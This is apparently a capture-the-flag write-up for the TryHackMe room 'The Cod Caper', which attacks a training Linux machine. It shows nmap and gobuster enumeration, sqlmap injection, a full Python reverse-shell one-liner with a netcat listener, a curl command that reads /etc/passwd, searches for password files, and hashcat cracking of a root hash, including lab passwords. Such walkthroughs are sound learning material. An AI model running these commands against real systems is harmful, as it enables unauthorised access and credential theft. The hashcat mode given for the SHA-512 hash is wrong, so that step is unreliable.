FOREWORD: We all get stuck which is why write-ups exist however, I would suggest you try your best to come up with the correct answer before seeking the answer. Most problems are meant to be solved but a process must be followed which is why I explain the various steps/commands used in order to arrive at a solution. Do your best ! Enjoy the process !

&nbsp;  

![image](https://user-images.githubusercontent.com/61631671/124054826-cecf4280-d9f0-11eb-957e-2e114155d3c6.png)

&nbsp;  


# The Cod Caper #



[This Room ]( https://tryhackme.com/room/thecodcaper)is a beginner friendly room that allows users to infiltrate and exploit a Linux based system. 

# [ Task 1 - Intro ]

*No answer needed*

# [ Task 2 - Host Enumeration ]

The objective of this task is to obtain as much information about any open ports on the gievn machine. 

Useful flags : 


| Flag | Use |
| ------------- | ------------- |
| -p  | Used to specify which port to analyze. This can also be used to specify a range of ports *i.e -p 1-1000*  |
| -sV  | Runs default scripts on the port, used for doing basic analysis on services running on a port  |
| -A  | Aggressive mode, obtains all related information  |


&nbsp; 
&nbsp; 



## How many ports are open on the target machine? ##


To get this result an nmap scan must be done on all ports on the given IP address. Following the guide provided, I came up with 
`nmap -p 1-1000 -sC -A <GIVEN IP ADDRESS>` which provides the following output and the answers to all of the questions in this section


  
![image](https://user-images.githubusercontent.com/61631671/123824078-b9acc380-d8cb-11eb-8e52-98260af287a9.png)



*From the given output it is determined that there are `2` open ports on the target machine.*

&nbsp;    
&nbsp;   

## What is the http-title of the web server?



*Apache2 Ubuntu Default Page: It works*

&nbsp;    
&nbsp;

## What version is the ssh service? ##



*OpenSSH 7.2p2 Ubuntu 4ubuntu2.8*

&nbsp;    
&nbsp;

## What is the version of the web server? ##


*Apache/2.4.18*

# [ Task 3 - Web Enumeration ] #

The objective of this task is to research the web server for any vulnerabilites using the *gobuster* tool which is a brute force tool. 




Recommended tool: gobuster


| Flag | Use |
| ------------- | ------------- |
| -x  | Specifies file extensions such as php,txt,html  |
| -u  | Specifies which URL to use  |
| -t  | Specifies the number of CPU threads to be used  |
| --wordlist  | Specifies which world list is appended to the url path such as "http://url.com/word1" "http://url.com/word2"  |
| dir | Specifies directory to be enumerated  |




*The objective of this task is simple. The goal is to familiarize the user with useful commands needed to navigate servers in order to locate potential vulnerabilities.*

##  What is the name of the important file on the server? ##

From the previous excersise using *nmap* I found that port 80 is open on the machine. So I checked in the browser using the given IP which leads us to the default page.  
&nbsp; 
![image](https://user-images.githubusercontent.com/61631671/123954950-06010d80-d977-11eb-8704-463fae5b3aff.png)

&nbsp;  

With this information I am now able to use the Kali Gobuster tool to enumerate the directories.

&nbsp; 


When I combined the given flags with the given IP address (*gobuster dir -u `<GIVEN IP ADDRESS>` --wordlist /usr/share/wordlists/dirb/common.txt -x html,php,txt*) with the wordlist *common.txt* I came up with the following result : 



&nbsp; 


![image](https://user-images.githubusercontent.com/61631671/123962766-cb4fa300-d97f-11eb-954f-7cfb52db0e32.png)

&nbsp; 

*Based off the output `administrator.php` seems to be an important file that would contain valuable information that could be exploited.*




## *Reference* ##

[Kali Gobuster Tool](https://tools.kali.org/web-applications/gobuster) 

&nbsp;  

# [ Task 4 - Web Exploitation ]

For this task the objective is to successfully crack the password to the administrator account  SQLinjection, an open-sourced tool used to exploit servers.

&nbsp; 

| Flag | Use |
| ------------- | ------------- |
| -u  | Specifies the URL to be attacked  |
| --forms  | Used to autoomaticaly select the parameters  |
| --dump  | Used to retrieve all data once the SQLI is found |
| -a  | Retrieves all information from the database  |

## What is the admin username? ##

A SQL injection must be done to obtain this information using related commands and sqlmap. I used *sqlmap -u http://`<GIVEN IP ADDRESS>`/administrator.php --forms --dump*  which gives this result and access to the website : 

![image](https://user-images.githubusercontent.com/61631671/123973970-3c945380-d98a-11eb-803d-82c5aee2c5ee.png)

## What is the admin password? ##

Using the output from the previous task we get `secretpass`


![image](https://user-images.githubusercontent.com/61631671/123973779-0eaf0f00-d98a-11eb-9c17-05d1d1f3c494.png)

&nbsp;  

## How many forms of SQLI is the form vulnerable to? ##

Once we are able to access the site we are brought to a command prompt screen. To find the number of vulnerabilites I simply re-used the command I used in question 1 WITHOUT the --dump option since we are only looking for the amount of vulnerabilites. `sqlmap -u http://10.10.220.130/administrator.php --forms` provides an ouptut of `3` SQLI forms. 

&nbsp;  

# [ Task 5 - Command Execution ] #

Thai section requires research to determine if the users old account is active. If it is we are needing to find if specific files remain. 

## How many files are in the current directory? ##

I obtained this answer by utilizing the `ls` function on the command screen that we gained access to from the previous excersise. The following output shows that there are `3` files:

![image](https://user-images.githubusercontent.com/61631671/124051064-c0c9f380-d9e9-11eb-8128-c91fda4cbb90.png)

## Do I still hvae an account? ##

To begin you need to open up a listening port using netcat on your machine `nc -lnvp 1234`

Reverse shell is needed to perform the command neccessary to solve this problem. I used *python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((`"<GIVEN IP ADDRESS>"`,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'* 

I used  *curl -s --data-urlencode "cmd=cat /etc/passwd" -X POST http://`PROVIDED IP ADDRESS`/2591c98b70119fe624898b1e424b5e91.php | grep -v -e "^$" | grep -v "<"* .I used the `curl` command since we are transferring data and the flags needed to obtain the answer: `yes`

&nbsp; 

![image](https://user-images.githubusercontent.com/61631671/124052796-1d7add80-d9ed-11eb-9a56-3ab292950d53.png)

&nbsp; 

As you can see *"Pingu"* is still listed as an account.

## What is my SSH password? ##

So we figured out that Pingu still has an account. Now, we have to figure out the associated password. To do this we will need to use the `find` command to search through all of the files owned by Pingu.  My first thought was to use the `find` command to search for any shadow files may contain passwords. *find / 2>>/dev/null | grep -i shadow*.

&nbsp;  

![image](https://user-images.githubusercontent.com/61631671/124201492-385d5880-daa6-11eb-928d-bdeddd53a7b4.png)

&nbsp; 

I found a backup shadow directory! Lets use `cat` to see the contents! 

&nbsp;  

![image](https://user-images.githubusercontent.com/61631671/124201783-e0732180-daa6-11eb-8fd2-77472fd13047.png)

&nbsp;  

This didn't help. Next, I used the `find` command to search any content containing "pass" *find / 2>>/dev/null | grep -i pass* (I switched to the webpage interface for this one ) This is what populates:

&nbsp;  

![image](https://user-images.githubusercontent.com/61631671/124203527-e9fe8880-daaa-11eb-90e1-5c11a4d4e6a6.png)

&nbsp;  

`/var/hidden/pass`! Let's `cat` into this directory. 

&nbsp;  


![image](https://user-images.githubusercontent.com/61631671/124203713-57121e00-daab-11eb-97de-c2824f3f90f5.png)

We found the password `pinguapingu`!

&nbsp;  

## *References* ##

[netcat](https://nmap.org/ncat/)
&nbsp;  
[sqlmap](https://sqlmap.org/) 
&nbsp;  
[Python - Reverse Shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
&nbsp;  
[curl](https://www.tutorialspoint.com/unix_commands/curl.htm)



# [ Task 6 - LinEnum ] #

In this task the objective is to use LinEnum to download LinEnum and use it for priviledge escalation. 
First, I used ssh and the login information obtained from the previous task to login as Pingu. *ssh pingu@`<GIVEN IP ADDRESS>` 

Next I used the function *find /  -perm -u=s -type f 2>/dev/null* to locate the SUID which gace me this: 

![image](https://user-images.githubusercontent.com/61631671/124210166-f5f14700-dab8-11eb-9a0c-9b0c67768587.png)

&nbsp; 

A *secret* path? Sounds very interesting to me! `/opt/secret/root`

## *Reference* ##

[LinEnum](https://en.kali.tools/all/?tool=757)
[SUID](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit)

## *The next few tasks go over tools that can be used to carry out "Binary Exploitation". Everyone has their own way of doing things so various exploitation methods are explained. There are no tasks to be completed but there is a lot of information to retain and use for hte final tasks.* ##


# [ Task 7 - pwndbg ] #

*No answer needed*

# [ Task 8 -  Binary-Exploitaion: Manually ] #

*No answer needed*

## *Reference* ##

[Disassemble Shell](https://visualgdb.com/gdbreference/commands/disassemble)

# [ Task 9 - Binary Exploitation: The pwntools way ] #

*No answer needed*

## *Reference* ##

[pwnTools](https://python3-pwntools.readthedocs.io/en/latest/)

# [ Task 10 - Finishing The Job ] # 

This task requires us to crack the root hash using the hash we received from the previous task `$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.`It is recommended that we use the following  `hashcat {flags} {hashfile} {wordlist}` with the following flags : 



I copied the hash and saved it as a *llama.txt*. Now I am going to attempt cracking the file using `hashcat -m 0 -a 0 -o llama.txt /usr/share/wordlists/rockyou.txt `. Let's see what we get! *FYI This may take a while*

| Flag | Use |
| ------------- | ------------- |
| -a  | Used to specify attack mode  |
| -m  | Used to specify which mode to use |

&nbsp;  


![image](https://user-images.githubusercontent.com/61631671/124213415-81b9a200-dabe-11eb-8a48-2282ab2476ea.png)


Got it ! `love2fish `


## *References* ##

[Hashcat](https://resources.infosecinstitute.com/topic/hashcat-tutorial-beginners/)
[Hashcat](https://tools.kali.org/password-attacks/hashcat)
[Hashcat Modes](https://hashcat.net/wiki/doku.php?id=example_hashes)


*This room was a bit difficult for and took me longer than I expected. I spent a lot of time researching various tools and commands that I found myself unfamiliar with. However in the end I completed it which is all that matters!* 

Congratulations on completing The Cod Caper ! 



